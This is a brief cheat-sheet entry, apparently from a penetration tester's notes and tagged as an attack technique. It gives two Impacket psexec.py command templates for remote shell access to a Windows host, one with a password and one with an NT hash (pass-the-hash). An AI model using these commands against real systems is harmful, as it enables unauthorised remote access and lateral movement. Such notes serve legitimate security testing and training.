# psexec
#plateform/linux #target/remote #cat/ATTACK

## Psexec with password
```
rlwrap -crA psexec.py <domain>/<user>:'<passwd>'@<ip>
```

## Psexec with nthash
```
rlwrap -crA psexec.py <domain>/<user>@<ip> -hashes :<nthash>
```
